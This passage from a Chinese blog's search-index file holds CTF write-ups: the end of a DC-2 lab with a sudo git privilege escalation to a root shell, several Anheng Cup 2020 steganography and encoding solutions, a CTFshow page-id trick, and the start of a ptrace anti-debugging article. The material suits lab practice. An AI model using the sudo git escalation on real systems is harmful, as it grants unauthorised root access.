class="line"></span><br><span class="line">cd &#x2F;home&#x2F;jerry</span><br><span class="line">ls</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4079066750.png"></p><p>Go on - git outta here!!!!<br>æˆ‘ä»¬æ¥ç€gitææƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1732024288.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ls &#x2F;root</span><br><span class="line">cat &#x2F;root&#x2F;final-flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2030599542.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯2020</title>
      <link href="2021/03/07/2020%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>2021/03/07/2020%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æˆ‘æ²¡å‚åŠ ä¸Š~ é¢˜ç›®æ˜¯Y5neKOå¸ˆå‚…ç»™æˆ‘çš„ï¼ˆPSï¼šY5neKOå¸ˆå‚…æ‹¿äº†ä¸‰ç­‰å¥–ï¼TQLï¼ï¼‰</p></blockquote><h2 id="BeCare4"><a href="#BeCare4" class="headerlink" title="BeCare4"></a>BeCare4</h2><p><a href="https://pan.baidu.com/s/1VID6noh4hMKJX8ijvvC_ew">é™„ä»¶</a>ï¼ˆæå–ç ï¼šd9myï¼‰</p><p>npmtxt(ç¿»è¯‘)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2647919597.png"></p><p><a href="https://yuanfux.github.io/zero-width-web/">é›¶å®½éšå†™</a>ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼šRealV1siBle<br>æƒ³æ›´æ·±å…¥äº†è§£è¯¥éšå†™å¯æŸ¥çœ‹<a href="http://www.ga1axy.top/index.php/archives/20/">Galaxyå¸ˆå‚…çš„æ–‡ç« </a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3240318834.png"></p><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼ˆçœ‹wpå¾—çŸ¥æ˜¯silenteyeéšå†™ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1021854976.png"></p><p>ç›´æ¥é»˜è®¤å¯†ç å¾—åˆ°flagï¼šD0g3{1nV1sible_flag_Can_You_find?!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1822169658.png"></p><h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><p><a href="https://pan.baidu.com/s/1j1592RWMhdI7UNfWGum27g">é™„ä»¶</a>ï¼ˆæå–ç ï¼špvixï¼‰</p><p>ä¸éš¾çœ‹å‡ºè¿™é‡Œæ˜¯crcçˆ†ç ´</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4154854781.png"></p><p>æœ€åæˆåŠŸå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š!qQIdEa@#!z)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/633481274.png"></p><p>è§£å‹å¾—åˆ°readme.txt</p><blockquote><p>å‡ºé—¨ä¸€ç¬‘è«å¿ƒå“€ï¼Œæµ©è¡è¥Ÿæ€€åˆ°å¤„å¼€ã€‚<br>æ—¶äº‹éš¾ä»æ— è¿‡ç«‹ï¼Œè¾¾å®˜éè‡ªæœ‰ç”Ÿæ¥ã€‚<br>é£æ¶›å›é¦–ç©ºä¸‰å²›ï¼Œå°˜å£¤ä»å¤´æ•°ä¹å“ã€‚<br>ä¼‘ä¿¡å„¿ç«¥è½»è–„è¯­ï¼Œå—¤ä»–èµµè€é€ç¯å°ã€‚</p><p>åŠ›å¾®ä»»é‡ä¹…ç¥ç–²ï¼Œå†ç«­è¡°åº¸å®šä¸æ”¯ã€‚<br>è‹Ÿåˆ©å›½å®¶ç”Ÿæ­»ä»¥ï¼Œå²‚å› ç¥¸ç¦é¿è¶‹ä¹‹ã€‚<br>è°ªå±…æ­£æ˜¯å›æ©åšï¼Œå…»æ‹™åˆšäºæˆå’å®œã€‚<br>æˆä¸å±±å¦»è°ˆæ•…äº‹ï¼Œè¯•åŸæ–­é€è€å¤´çš®ã€‚</p></blockquote><p>è¿™é‡Œå¥½åƒæ–‡ä»¶æœ‰ç‚¹é—®é¢˜ï¼Œå¾…ç»­â€¦</p><h2 id="ç‹ç‰Œç‰¹å·¥"><a href="#ç‹ç‰Œç‰¹å·¥" class="headerlink" title="ç‹ç‰Œç‰¹å·¥"></a>ç‹ç‰Œç‰¹å·¥</h2><p><a href="https://pan.baidu.com/s/1FuVfFNtdB9Rov5HCaXCobw">é™„ä»¶</a>ï¼ˆæå–ç ï¼šai9dï¼‰</p><p>ç£ç›˜å–è¯ï¼Œfileå‘½ä»¤å‘ç°å®ƒæ˜¯ä¸ªç£ç›˜ext3</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/980189465.png"></p><p>æŒ‚è½½å¾—åˆ°ä¸€ä¸ªflagboxå’Œä¸€ä¸ªkey.txtæç¤º</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1164358016.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/640140118.png"></p><blockquote><p>key:a_cool_key<br>use Veracrypt</p></blockquote><p>äºæ˜¯ä¹ç”¨<a href="https://pan.baidu.com/s/1fxkBdoVQj3jDw4hWVv-Wxw">Veracrypt</a>ï¼ˆæå–ç ï¼š0h1bï¼‰æŒ‚è½½flagboxå¾—åˆ°flag.txtï¼Œbutå®ƒå´æ˜¯ä¸ªå‡flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3343605263.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1532584697.png"></p><p>å¡ä½äº†~å¾…ç»­â€¦</p><h2 id="å¼€å§‹æŠ‘éƒ"><a href="#å¼€å§‹æŠ‘éƒ" class="headerlink" title="å¼€å§‹æŠ‘éƒ"></a>å¼€å§‹æŠ‘éƒ</h2><p><a href="https://pan.baidu.com/s/1K4yUH21QoTlpKSAOdtYgOA">é™„ä»¶</a>ï¼ˆæå–ç ï¼š4bcoï¼‰</p><p>ä¸€è¨€ä¸åˆä¸Šæ¥å°±æ˜¯binwalkï¼Œåˆ†ç¦»å‡ºä¸€åŠ å¯†çš„å‹ç¼©åŒ…ä»¥åŠæ‰“ä¸å¼€çš„å›¾ç‰‡ï¼ˆç›´æ¥æ”¹å›¾ç‰‡åç¼€ä¸ºzip<br>æ¥ç€010æ‰“å¼€å›¾ç‰‡å‘ç°æ–‡ä»¶å¤´æœ‰é—®é¢˜ï¼Œä¿®æ”¹ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3680280649.png"></p><p>å›å¤´çœ‹æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/537832568.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;-----.&lt;&lt;&lt;&lt;+.&gt;-----.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..</span><br></pre></td></tr></table></figure><p>è§£å¯†ä¸€ä¸‹ï¼š<a href="http://ctf.ssleye.com/brain.html">brainfuck</a> -&gt; <a href="http://ctf.ssleye.com/jsfuck.html">jsfuck</a>ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š20200824152800ï¼ˆbushiï¼›æ¥ç€è½¬æ³¢<a href="https://www.beijing-time.org/shijianchuo/">æ—¶é—´æˆ³</a>å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š1598254080ï¼›å¾—åˆ°å¦‚ä¸‹ä¸€å¼ å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3443620349.png"></p><p>ä¸éš¾çœ‹å‡ºæ˜¯ã€Šç¦å°”æ‘©æ–¯æ¢æ¡ˆé›†ã€‹é‡Œè·³èˆçš„å°äººï¼Œå¯¹ç…§è§£å¯†å¾—åˆ°ï¼šWATCHTHEVIDEO</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5293066.png"></p><p>watch the video? è§†é¢‘åœ¨å“ª~ äºæ˜¯ä¹binwalkä¸‹è¿™å¼ å›¾å¾—åˆ°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3906753525.png"></p><p>å°†flag.pngæ”¾åˆ°010ä¿®å¤ä¸€ä¸‹å¾—åˆ°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/234230153.png"></p><p>æ¥ç€ç”¨TweakPNGæ ¡éªŒå‘ç°æ•°æ®å—å¼‚å¸¸</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3751799558.png"></p><p>ç„¶åä¿®æ”¹é«˜åº¦ï¼ŒæŸ¥çœ‹å›¾ç‰‡å‘ç°äº†flagæ ¼å¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2456199894.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1412817610.png"></p><p>è¿™æ—¶å¯ä»¥çŸ¥é“flagå°±æ˜¯åœ¨é‚£å…­å¼ å›¾ç‰‡é‡Œé¢çš„ä¿¡æ¯ï¼Œå…ˆæ‰“å¼€ä½ çš„åå­—é‚£ä¸ªBç«™é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;bangumi&#x2F;play&#x2F;ep118250</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/800838382.png"></p><p>ç„¶åæ ¹æ®çƒå·æ‰¾åˆ°å¯¹åº”ä½ç½®ï¼ˆ6ï¼š12ã€21ï¼š05ã€22ï¼š24ã€44ï¼š52ã€93ï¼š25ï¼‰å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1200</span><br><span class="line">2016</span><br><span class="line">GRANDMENU</span><br><span class="line">RCHITECTURE</span><br><span class="line">1335</span><br><span class="line">æ•´åˆå¾—åˆ°flagï¼šflag&#123;1200-2016-GRANDMENU-RCHITECTURE-1335&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2116052045.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3082374543.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2954252164.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/862170533.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3190111931.png"></p><h2 id="yang"><a href="#yang" class="headerlink" title="yang"></a>yang</h2><p><a href="https://pan.baidu.com/s/1OD1-9BbiSfcjDAEBi0-FmQ">é™„ä»¶</a>ï¼ˆæå–ç ï¼šomzgï¼‰</p><p>å±æ€§æŸ¥çœ‹å¾—åˆ°ï¼ši-soon chengli timeï¼Œä¸€æŸ¥å¾—çŸ¥å®‰æ´µçš„æˆç«‹æ—¶é—´ä¸º20150331</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1472045686.png"></p><p>MP3Stegoéšå†™å¾—åˆ°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1828343654.png"></p><p>æ¥ç€ä¸ä½›è®ºç¦…è§£å¾—æ˜¯ä¸ªzip</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3892872245.png"></p><p>010å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4114469183.png"></p><p>ä»æ³¨è§£ä¸­å‘ç°åº”è¯¥æ˜¯Morseç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/564220448.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. .-.. .- --. .. -....- ... --- --- -. -....- -.... .-</span><br></pre></td></tr></table></figure><p>Morseè§£ç å¾—åˆ°flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag i-soon-6a</span><br></pre></td></tr></table></figure><h2 id="ä¸€å°æƒ…ä¹¦"><a href="#ä¸€å°æƒ…ä¹¦" class="headerlink" title="ä¸€å°æƒ…ä¹¦"></a>ä¸€å°æƒ…ä¹¦</h2><p><a href="https://pan.baidu.com/s/1De-qQi-ZAA23QelmU_gRVA">é™„ä»¶</a>ï¼ˆæå–ç ï¼š0klpï¼‰</p><p>æ‰“å¼€æƒ…ä¹¦å‘ç°æ˜¯9409=97x97çš„äºŒå€¼å›¾åƒçš„å€¼ï¼Œè„šæœ¬æ•´ä¸æ¥ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯Y5neKoå¸ˆå‚…æ•´çš„<a href="https://tool.ysneko.com/bin_QR/">å¼€æºé¡¹ç›®</a>ï¼ˆPSï¼šç™½å«–æ€ªä¹Ÿå¿…é¡»å®‰æ’ä¸Š<a href="https://tools.harvey.plus/">Harveyåœ¨çº¿å·¥å…·</a>ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2873727401.png"></p><p>æ‰«ç å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OTctMyAxLTMgMS0zIDMtMiAzLTIgMy0yIDEtMiAxLTUgMS0yIDEtMyAzLTIgOTctMyAzLTIgOTQtMSAxLTUgNC0yIDQtMiA0LTIgNC0yIDk3LTMgMS0zIDMtMiA0LTIgMS01IDMtMiA0LTIgMy0yIDMtMiAzLTIgNC0yIDk3LTMgMy0yIDEtNSAxLTUgMy0yIDEtMyA0LTIgNC0yIDEtMiAzLTIgMS0zIDQtMiA0LTIgNC0yIDMtMiA5NC0xIDEtMyAxLTMgMS0zIDMtMiA\zLTIgMS0zIDk0LTEgMS0zIDk0LTEgNC0yIDMtMiAxLTIgOTctMyA5Ny0zIDEtMw&#x3D;</span><br></pre></td></tr></table></figure><p>Base64è§£å¾—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">97-3 1-3 1-3 3-2 3-2 3-2 1-2 1-5 1-2 1-3 3-2 97-3 3-2 94-1 1-5 4-2 4-2 4-2 4-2 97-3 1-3 3-2 4-2 1-5 3-2 4-2 3-2 3-2 3-2 4-2 97-3 3-2 1-5 1-5 3-2 1-3 4-2 4-2 1-2 3-2 1-3 4-2 4-2 4-2 3-2 94-1 1-3 1-3 1-3 3-2 3-2 1-3 94-1 1-3 94-1 4-2 3-2 1-2 97-3 97-3 1-3</span><br></pre></td></tr></table></figure><p>æ¥ç€æ ¹æ®ä»¥ä¸Šåæ ‡æå–äºŒç»´ç ä¸Šçš„è‰²å—å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1110001111010110000110010000001011010010100001111001111001111</span><br></pre></td></tr></table></figure><p>æœ€å<a href="https://www.sojson.com/hexconvert.html">äºŒè¿›åˆ¶è½¬36è¿›åˆ¶</a>å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagj5w2a0ow</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰æ´µæ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-ç¾¤å‹æŒ‘æˆ˜</title>
      <link href="2021/03/05/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/"/>
      <url>2021/03/05/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="CTFshowç¦åˆ©æŠ½å¥–"><a href="#CTFshowç¦åˆ©æŠ½å¥–" class="headerlink" title="CTFshowç¦åˆ©æŠ½å¥–"></a>CTFshowç¦åˆ©æŠ½å¥–</h2><p>æ‰“å¼€å®¹å™¨ä¸€çœ‹ç«Ÿæ˜¯ç™½ç»™flagï¼Œç»“æœè¿”å›ä¸€çœ‹ï¼Œå¥½å®¶ä¼™ï¼Œæäº¤æ¡†æ²¡äº†~<br>äºæ˜¯ä¹å·æ¢æ¢æŸ±ï¼Œæ‰“å¼€éš”å£è€ç‹å®¶çš„å¤§é—¨ï¼Œf12å°†idæ”¹æˆæŠ½å¥–é¢˜çš„idå³å¯æˆåŠŸæäº¤flag</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/74258207.png"></p><p>åˆ†å­ç«Ÿä¸æ˜¯æˆ‘è‡ªå·±.gif</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2445478444.png"></p><p>å¾…ç»­â€¦</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-æ²™ç›’å…¥é—¨ï¼Œptraceä»0åˆ°1</title>
      <link href="2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/"/>
      <url>2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡æ˜¯åœ¨linuxç³»ç»Ÿè§’åº¦ä¸‹ï¼Œå¯¹ptraceåè°ƒè¯•è¿›è¡Œåº•å±‚åˆ†æï¼Œä½¿æˆ‘ä»¬æ›´æ¸…æ¥šçš„çœ‹åˆ°ä¸€äº›åº•å±‚åŸç†çš„å®ç°ï¼Œæ›´å¥½çš„ç†è§£åœ¨é€†å‘å·¥ç¨‹ä¸­çš„ä¸€äº›çªç ´å£ï¼Œç—…æ¯’æ€ä¹ˆå®ç°ä»£ç æ³¨å…¥ï¼Œæœ¬æ–‡è¿˜å°†åˆ—å‡ºä¸€äº›å¸¸è§çš„æ”»é˜²æ‰‹æ®µï¼Œåˆ†æå…¶åŸç†ï¼Œè®©æˆ‘ä»¬ä¸€åŒè§è¯è§è¯èŒ…ä¸ç›¾æ¿€æƒ…å¯¹å†³ï¼</p><h2 id="ä»€ä¹ˆæ˜¯ptraceï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ptraceï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ptraceï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ptraceï¼Ÿ</h2><p>å¦‚æœäº†è§£è¿‡é€†å‘å·¥ç¨‹çš„å°ä¼™ä¼´ï¼Œè‚¯å®šå¯¹è¿™ä¸ªptraceä¸é™Œç”Ÿï¼Œå› ä¸ºè¿™æ˜¯åè°ƒè¯•æŠ€æœ¯ä¸­çš„åŸºç¡€å…¥é—¨æ‰‹æ®µï¼Œè™½ç„¶ç°åœ¨è¯¸å¦‚ä»£ç è™šæ‹ŸåŒ–ä¹‹ç±»çš„å…¶ä»–é˜²é€†å‘æŠ€æœ¯å·²ç»å¾ˆæˆç†Ÿäº†ï¼Œä½†æ˜¯ptraceä»ç„¶æ˜¯ä¸€äº›å•†ä¸šè½¯ä»¶äº§å“ä¸­ä½¿ç”¨ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å…¥é—¨åè°ƒè¯•æ‰€å¿…é¡»çš„åŸºç¡€æŠ€æœ¯ï¼</p><p>ptraceåœ¨linux åè°ƒè¯•æŠ€æœ¯ä¸­çš„åœ°ä½å°±å¦‚åŒncåœ¨å®‰å…¨ç•Œçš„åœ°ä½ï¼Œç‘å£«å†›åˆ€å•Š!</p><p>ptraceä½¿ç”¨åœºæ™¯ï¼š</p><ol><li>ç¼–å†™åŠ¨æ€åˆ†æå·¥å…·ï¼Œå¦‚gdb,strace</li><li>åè¿½è¸ªï¼Œä¸€ä¸ªè¿›ç¨‹åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹è¿½è¸ª(<em>æ³¨ï¼šä¸€ä¸ªè¿›ç¨‹èƒ½åŒæ—¶è¿½è¸ªå¤šä¸ªè¿›ç¨‹</em>)ï¼Œè‹¥æ­¤è¿›ç¨‹å·²è¢«è¿½è¸ªï¼Œå…¶ä»–åŸºäºptraceçš„è¿½è¸ªå™¨å°†æ— æ³•å†è¿½è¸ªæ­¤è¿›ç¨‹ï¼Œæ›´è¿›ä¸€æ­¥å¯ä»¥å®ç°å­æ¯è¿›ç¨‹åŒçº¿æ‰§è¡ŒåŠ¨æ€è§£å¯†ä»£ç ç­‰æ›´é«˜çº§çš„ååˆ†ææŠ€æœ¯</li><li>ä»£ç æ³¨å…¥ï¼Œå¾€å…¶ä»–è¿›ç¨‹é‡Œæ³¨å…¥ä»£ç ã€‚</li><li>ä¸é€€å‡ºè¿›ç¨‹ï¼Œè¿›è¡Œåœ¨çº¿å‡çº§ã€‚</li></ol><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Ptrace å¯ä»¥è®©çˆ¶è¿›ç¨‹æ§åˆ¶å­è¿›ç¨‹è¿è¡Œï¼Œå¹¶å¯ä»¥æ£€æŸ¥å’Œæ”¹å˜å­è¿›ç¨‹çš„æ ¸å¿ƒimageçš„åŠŸèƒ½ï¼ˆPeek and poke åœ¨ç³»ç»Ÿç¼–ç¨‹ä¸­æ˜¯å¾ˆçŸ¥åçš„å«æ³•ï¼ŒæŒ‡çš„æ˜¯ç›´æ¥è¯»å†™å†…å­˜å†…å®¹ï¼‰ã€‚ptraceä¸»è¦è·Ÿè¸ªçš„æ˜¯è¿›ç¨‹è¿è¡Œæ—¶çš„çŠ¶æ€ï¼Œç›´åˆ°æ”¶åˆ°ä¸€ä¸ªç»ˆæ­¢ä¿¡å·ç»“æŸè¿›ç¨‹ï¼Œè¿™é‡Œçš„ä¿¡å·å¦‚æœæ˜¯æˆ‘ä»¬ç»™ç¨‹åºè®¾ç½®çš„æ–­ç‚¹ï¼Œåˆ™è¿›ç¨‹è¢«ä¸­æ­¢ï¼Œå¹¶ä¸”é€šçŸ¥å…¶çˆ¶è¿›ç¨‹ï¼Œåœ¨è¿›ç¨‹ä¸­æ­¢çš„çŠ¶æ€ä¸‹ï¼Œè¿›ç¨‹çš„å†…å­˜ç©ºé—´å¯ä»¥è¢«è¯»å†™ã€‚å½“ç„¶çˆ¶è¿›ç¨‹è¿˜å¯ä»¥ä½¿å­è¿›ç¨‹ç»§ç»­æ‰§è¡Œï¼Œå¹¶é€‰æ‹©æ˜¯å¦å¿½ç•¥å¼•èµ·ä¸­æ­¢çš„ä¿¡å·ï¼Œptraceå¯ä»¥è®©ä¸€ä¸ªè¿›ç¨‹ç›‘è§†å’Œæ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œ,å¹¶ä¸”ä¿®æ”¹è¢«ç›‘è§†è¿›ç¨‹çš„å†…å­˜ã€å¯„å­˜å™¨ç­‰,ä¸»è¦åº”ç”¨äºæ–­ç‚¹è°ƒè¯•å’Œç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªï¼Œstraceå’Œgdbå·¥å…·å°±æ˜¯åŸºäºptraceç¼–å†™çš„ï¼</p><p>ptrace()å…¶å®æ˜¯linuxçš„ä¸€ç§ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ç”¨gdbè¿›è¡Œattachå…¶ä»–è¿›ç¨‹çš„æ—¶å€™ï¼Œéœ€è¦rootæƒé™ã€‚</p><h3 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" 